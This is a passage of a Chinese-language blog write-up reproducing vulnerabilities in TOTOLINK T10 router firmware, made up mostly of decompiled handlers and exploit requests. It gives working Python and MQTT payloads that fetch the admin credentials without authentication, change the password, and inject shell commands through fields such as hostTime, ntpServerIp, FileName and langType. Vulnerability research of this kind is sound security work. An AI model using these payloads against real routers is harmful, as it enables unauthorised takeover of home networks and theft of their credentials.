cste_hook_register(<span class=\"string\">&quot;clearSyslog&quot;</span>, clearSyslog);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;setSyslogCfg&quot;</span>, setSyslogCfg);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;getMiniUPnPConfig&quot;</span>, getMiniUPnPConfig);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;setMiniUPnPConfig&quot;</span>, setMiniUPnPConfig);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;LoadDefSettings&quot;</span>, LoadDefSettings);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;RebootSystem&quot;</span>, RebootSystem);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;FirmwareUpgrade&quot;</span>, FirmwareUpgrade);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;getRebootScheCfg&quot;</span>, getRebootScheCfg);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;setRebootScheCfg&quot;</span>, setRebootScheCfg);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;getTelnetCfg&quot;</span>, getTelnetCfg);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;setTelnetCfg&quot;</span>, setTelnetCfg);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;SystemSettings&quot;</span>, SystemSettings);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"6-1-1-getPasswordCfg-未授权获取用户名密码\"><a href=\"#6-1-1-getPasswordCfg-未授权获取用户名密码\" class=\"headerlink\" title=\"6.1.1 getPasswordCfg 未授权获取用户名密码\"></a>6.1.1 getPasswordCfg 未授权获取用户名密码</h3><h4 id=\"mqtt-1883端口攻击\"><a href=\"#mqtt-1883端口攻击\" class=\"headerlink\" title=\"mqtt 1883端口攻击\"></a>mqtt 1883端口攻击</h4><p>totolink&#x2F;router&#x2F;setting&#x2F;getPasswordCfg</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"string\">&quot;topicurl&quot;</span>:<span class=\"string\">&quot;setting/getPasswordCfg&quot;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>会直接返回用户名密码</p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230509154711114.png\" alt=\"image-20230509154711114\"></p>\n<h4 id=\"80端口攻击\"><a href=\"#80端口攻击\" class=\"headerlink\" title=\"80端口攻击\"></a>80端口攻击</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">response = requests.post(<span class=\"string\">&quot;http://192.168.55.1/cgi-bin/cstecgi.cgi&quot;</span>,data=<span class=\"string\">&#x27;&#123;&quot;topicurl&quot;:&quot;setting/getPasswordCfg&quot;&#125;&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(response.text)</span><br></pre></td></tr></table></figure>\n\n<p>效果</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(base) ➜  router python3 password.<span class=\"built_in\">exp</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"string\">&quot;admuser&quot;</span>:\t<span class=\"string\">&quot;admin&quot;</span>,</span><br><span class=\"line\">\t<span class=\"string\">&quot;admpass&quot;</span>:\t<span class=\"string\">&quot;123456888&quot;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p>GetLanguageCfg也可以,不过不在system.so这里</p>\n<h3 id=\"6-1-2-setPasswordCfg-未授权修改密码\"><a href=\"#6-1-2-setPasswordCfg-未授权修改密码\" class=\"headerlink\" title=\"6.1.2 setPasswordCfg 未授权修改密码\"></a>6.1.2 setPasswordCfg 未授权修改密码</h3><p>totolink&#x2F;router&#x2F;setting&#x2F;setPasswordCfg</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"string\">&quot;topicurl&quot;</span>:<span class=\"string\">&quot;setting/setPasswordCfg&quot;</span>,</span><br><span class=\"line\">\t<span class=\"string\">&quot;admuser&quot;</span>:<span class=\"string\">&quot;admin&quot;</span>,</span><br><span class=\"line\">\t<span class=\"string\">&quot;admpass&quot;</span>:<span class=\"string\">&quot;123456888&quot;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"6-1-3-NTPSyncWithHost-命令执行\"><a href=\"#6-1-3-NTPSyncWithHost-命令执行\" class=\"headerlink\" title=\"6.1.3 NTPSyncWithHost 命令执行\"></a>6.1.3 NTPSyncWithHost 命令执行</h3><h4 id=\"mqtt-1883端口\"><a href=\"#mqtt-1883端口\" class=\"headerlink\" title=\"mqtt 1883端口\"></a>mqtt 1883端口</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">totolink/router/setting/NTPSyncWithHost</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"string\">&quot;topicurl&quot;</span>:<span class=\"string\">&quot;setting/NTPSyncWithHost&quot;</span>,</span><br><span class=\"line\">\t<span class=\"string\">&quot;hostTime&quot;</span>:<span class=\"string\">&quot;;&#x27;$(/tmp/busybox-mipsel$&#123;IFS&#125;touch$&#123;IFS&#125;/tmp/test123)&#x27;;&quot;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"80端口\"><a href=\"#80端口\" class=\"headerlink\" title=\"80端口\"></a>80端口</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">response = requests.post(<span class=\"string\">&quot;http://192.168.55.1/cgi-bin/cstecgi.cgi&quot;</span>,data=<span class=\"string\">&#x27;&#123;&quot;topicurl&quot;:&quot;setting/NTPSyncWithHost&quot;,&quot;hostTime&quot;:&quot;;\\&#x27;$(/tmp/busybox-mipsel$&#123;IFS&#125;touch$&#123;IFS&#125;/tmp/test123)\\&#x27;;&quot;&#125;&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(response.text)</span><br></pre></td></tr></table></figure>\n\n\n\n<p>主要漏洞原因是获取了hostTime参数后,直接拼接起来然后传给了CsteSystem进行命令执行了</p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230510111118962.png\" alt=\"image-20230510111118962\"></p>\n<h3 id=\"6-1-4-setNTPCfg-命令执行\"><a href=\"#6-1-4-setNTPCfg-命令执行\" class=\"headerlink\" title=\"6.1.4 setNTPCfg 命令执行\"></a>6.1.4 setNTPCfg 命令执行</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">totolink/router/setting/setNTPCfg</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;topicurl&quot;</span>:<span class=\"string\">&quot;setting/setNTPCfg&quot;</span>,</span><br><span class=\"line\">\t<span class=\"string\">&quot;tz&quot;</span>:<span class=\"string\">&quot;UTC+0&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;ntpServerIp&quot;</span>:<span class=\"string\">&quot;;&#x27;$(/tmp/busybox-mipsel$&#123;IFS&#125;touch$&#123;IFS&#125;/tmp/test123456)&#x27;;&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;ntpClientEnabled&quot;</span>:<span class=\"string\">&quot;ON&quot;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230510112944980.png\" alt=\"image-20230510112944980\"></p>\n<p>apmib_set在哪呢?</p>\n<p>搜索一下 grep -rin apmib_set</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(base) ➜  squashfs-root grep -rin apmib_set</span><br><span class=\"line\">Binary file ./bin/csteSys matches</span><br><span class=\"line\">Binary file ./bin/AC matches</span><br><span class=\"line\">Binary file ./bin/cs_statistics matches</span><br><span class=\"line\">Binary file ./bin/WTP matches</span><br><span class=\"line\">Binary file ./bin/flash matches</span><br><span class=\"line\">Binary file ./bin/sysconf matches</span><br><span class=\"line\">Binary file ./bin/ntp_inet matches</span><br><span class=\"line\">Binary file ./bin/fwupg matches</span><br><span class=\"line\">Binary file ./bin/AACWTP matches</span><br><span class=\"line\">Binary file ./lib/cste_modules/wan.so matches</span><br><span class=\"line\">Binary file ./lib/cste_modules/wps.so matches</span><br><span class=\"line\">Binary file ./lib/cste_modules/system.so matches</span><br><span class=\"line\">Binary file ./lib/cste_modules/firewall.so matches</span><br><span class=\"line\">Binary file ./lib/cste_modules/wireless.so matches</span><br><span class=\"line\">Binary file ./lib/cste_modules/global.so matches</span><br><span class=\"line\">Binary file ./lib/cste_modules/lan.so matches</span><br><span class=\"line\">Binary file ./lib/libapmib.so matches</span><br><span class=\"line\">Binary file ./lib/libcstelib.so matches</span><br></pre></td></tr></table></figure>\n\n<p>​\t\tBinary file .&#x2F;lib&#x2F;libapmib.so matches 这个名字看着就像,但是这个一个第三方库,就是设置值的,不像是触发漏洞的点</p>\n<p>​\t\t后来进行gdb动态调试的时候发现,system触发点在set_timeZone()函数中,也很奇怪,因为这个函数并没有传入的值. </p>\n<h2 id=\"6-2-upgrade-so\"><a href=\"#6-2-upgrade-so\" class=\"headerlink\" title=\"6.2 upgrade.so\"></a>6.2 upgrade.so</h2><p>主要函数</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">module_init</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  cste_save_fwinfo();</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;setUpgradeFW&quot;</span>, &amp;setUpgradeFW);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;setUploadSetting&quot;</span>, &amp;setUploadSetting);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;CloudACMunualUpdate&quot;</span>, CloudACMunualUpdate);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;slaveUpgrade&quot;</span>, slaveUpgrade);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __fastcall <span class=\"title function_\">dl</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">char</span> *a1)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> v3[<span class=\"number\">512</span>]; <span class=\"comment\">// [sp+18h] [-300h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">char</span> v4[<span class=\"number\">256</span>]; <span class=\"comment\">// [sp+218h] [-100h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(v3, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(v3));</span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(v4, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(v4));</span><br><span class=\"line\">  getStrFromTmp(<span class=\"string\">&quot;DlFileUrl&quot;</span>, v4);</span><br><span class=\"line\">  <span class=\"built_in\">sprintf</span>(v3, <span class=\"string\">&quot;wget -O %s  %s&quot;</span>, a1, v4);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> CsteSystem(v3, <span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>getStrFromTmp这个是干什么的..</p>\n<h4 id=\"6-2-1-setUpgradeFW-命令执行\"><a href=\"#6-2-1-setUpgradeFW-命令执行\" class=\"headerlink\" title=\"6.2.1 setUpgradeFW 命令执行\"></a>6.2.1 setUpgradeFW 命令执行</h4><p>​\t\t注意这里拼接命令和其他有所不同</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">totolink/router/setting/setUpgradeFW</span><br><span class=\"line\">    </span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"string\">&quot;topicurl&quot;</span>:<span class=\"string\">&quot;setting/setUpgradeFW&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;Flags&quot;</span>:<span class=\"number\">1</span>,</span><br><span class=\"line\">\t<span class=\"string\">&quot;FileName&quot;</span>:<span class=\"string\">&quot;;/tmp/busybox-mipsel$&#123;IFS&#125;touch$&#123;IFS&#125;/tmp/setUpgradeFW;&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;ContentLength&quot;</span>:<span class=\"number\">12</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t当ContentLength小于0x100000时,执行LABEL_14的逻辑,这里是出现错误删除文件的功能,进行了拼接</p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514110249946.png\" alt=\"image-20230514110249946\"></p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514110102231.png\" alt=\"image-20230514110102231\"></p>\n<h4 id=\"6-2-2-setUploadSetting-命令执行\"><a href=\"#6-2-2-setUploadSetting-命令执行\" class=\"headerlink\" title=\"6.2.2 setUploadSetting 命令执行\"></a>6.2.2 setUploadSetting 命令执行</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">totolink/router/setting/setUploadSetting</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;topicurl&quot;</span>:<span class=\"string\">&quot;setting/setUploadSetting&quot;</span>,</span><br><span class=\"line\">\t<span class=\"string\">&quot;FileName&quot;</span>:<span class=\"string\">&quot;;/tmp/busybox-mipsel$&#123;IFS&#125;touch$&#123;IFS&#125;/tmp/setUploadSetting;&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;ContentLength&quot;</span>:<span class=\"string\">&quot;;/tmp/busybox-mipsel$&#123;IFS&#125;touch$&#123;IFS&#125;/tmp/setUploadSetting;&quot;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514111626192.png\" alt=\"image-20230514111626192\"></p>\n<p>获取的文件名会进行读取</p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514111658292.png\" alt=\"image-20230514111658292\"></p>\n<h4 id=\"6-2-3-slaveUpgrade-命令执行\"><a href=\"#6-2-3-slaveUpgrade-命令执行\" class=\"headerlink\" title=\"6.2.3 slaveUpgrade 命令执行\"></a>6.2.3 slaveUpgrade 命令执行</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">totolink/router/setting/slaveUpgrade</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"string\">&quot;topicurl&quot;</span>:<span class=\"string\">&quot;setting/slaveUpgrade&quot;</span>,</span><br><span class=\"line\">\t<span class=\"string\">&quot;url&quot;</span>:<span class=\"string\">&quot;;&#x27;$(/tmp/busybox-mipsel$&#123;IFS&#125;touch$&#123;IFS&#125;/tmp/test123)&#x27;;&quot;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514104331376.png\" alt=\"image-20230514104331376\"></p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514104424860.png\" alt=\"image-20230514104424860\"></p>\n<h2 id=\"6-3-global-so\"><a href=\"#6-3-global-so\" class=\"headerlink\" title=\"6.3 global.so\"></a>6.3 global.so</h2><p>​\t\t主要功能</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">module_init</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;getOpMode&quot;</span>, getOpMode);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;setOpMode&quot;</span>, setOpMode);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;getGlobalFeatureBuilt&quot;</span>, getGlobalFeatureBuilt);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;getSysStatusCfg&quot;</span>, getSysStatusCfg);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;getLanguageCfg&quot;</span>, getLanguageCfg);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;setLanguageCfg&quot;</span>, setLanguageCfg);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;loginAuth&quot;</span>, &amp;loginAuth);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;getSaveConfig&quot;</span>, &amp;getSaveConfig);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;getLedStatus&quot;</span>, getLedStatus);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;getWanAutoDetect&quot;</span>, &amp;getWanAutoDetect);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;setEasyWizardCfg&quot;</span>, setEasyWizardCfg);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;getEasyWizardCfg&quot;</span>, getEasyWizardCfg);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;autoDhcp&quot;</span>, autoDhcp);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"6-3-1-setLanguageCfg-命令执行\"><a href=\"#6-3-1-setLanguageCfg-命令执行\" class=\"headerlink\" title=\"6.3.1 setLanguageCfg 命令执行\"></a>6.3.1 setLanguageCfg 命令执行</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">totolink/router/setting/setLanguageCfg</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;topicurl&quot;</span>:<span class=\"string\">&quot;setting/setLanguageCfg&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;langType&quot;</span>:<span class=\"string\">&quot;;echo 123 &gt; /tmp/setLanguageCfg;&quot;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514112704936.png\" alt=\"image-20230514112704936\"></p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514112826832.png\" alt=\"image-20230514112826832\"></p>\n<h4 id=\"6-3-2-getLanguageCfg-信息泄露\"><a href=\"#6-3-2-getLanguageCfg-信息泄露\" class=\"headerlink\" title=\"6.3.2 getLanguageCfg 信息泄露\"></a>6.3.2 getLanguageCfg 信息泄露</h4><p>​\t\t用户名密码泄露</p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230509153514388.png\" alt=\"image-20230509153514388\"></p>\n<h2 id=\"6-4-firewall-so\"><a href=\"#6-4-firewall-so\" class=\"headerlink\" title=\"6.4 firewall.so\"></a>6.4 firewall.so</h2><p>​\t\t防火墙的,设置防火墙相应内容. 但是这里面system执行的内容都是写死的,不可控</p>\n<p>​\t\t有没有可能格式化字符串修改固定的值,然后进行命令利用?</p>\n<h2 id=\"6-5-wireless-so\"><a href=\"#6-5-wireless-so\" class=\"headerlink\" title=\"6.5 wireless.so\"></a>6.5 wireless.so</h2><h4 id=\"6-5-1-setWebWlanIdx-命令执行\"><a href=\"#6-5-1-setWebWlanIdx-命令执行\" class=\"headerlink\" title=\"6.5.1 setWebWlanIdx 命令执行\"></a>6.5.1 setWebWlanIdx 命令执行</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">totolink/router/setting/setWebWlanIdx</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;topicurl&quot;</span>:<span class=\"string\">&quot;setting/setWebWlanIdx&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;webWlanIdx&quot;</span>:<span class=\"string\">&quot;;echo 123 &gt; /tmp/setWebWlanIdx;&quot;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">import requests</span><br><span class=\"line\"></span><br><span class=\"line\">response = requests.post(<span class=\"string\">&quot;http://192.168.55.1/cgi-bin/cstecgi.cgi&quot;</span>,data=<span class=\"string\">&#x27;&#123;&quot;topicurl&quot;:&quot;setting/setWebWlanIdx&quot;,&quot;hostTime&quot;:&quot;;echo 123 &gt; /tmp/test123;&quot;)</span></span><br><span class=\"line\"><span class=\"string\">print(response.text)</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514114559605.png\" alt=\"image-20230514114559605\"></p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514114010466.png\" alt=\"image-20230514114010466\"></p>\n<h4 id=\"6-5-2-updateWifiInfo-命令执行\"><a href=\"#6-5-2-updateWifiInfo-命令执行\" class=\"headerlink\" title=\"6.5.2 updateWifiInfo 命令执行\"></a>6.5.2 updateWifiInfo 命令执行</h4><p>​\t\t注意newMd5参数不为0</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">totolink/router/setting/updateWifiInfo</span><br><span class=\"line\">    </span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;topicurl&quot;</span>:<span class=\"string\">&quot;setting/updateWifiInfo&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;serverIp&quot;</span>:<span class=\"string\">&quot;;/tmp/busybox-mipsel$&#123;IFS&#125;touch$&#123;IFS&#125;/tmp/updateWifiInfo;&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;newMd5&quot;</span>:<span class=\"number\">123</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514115843851.png\" 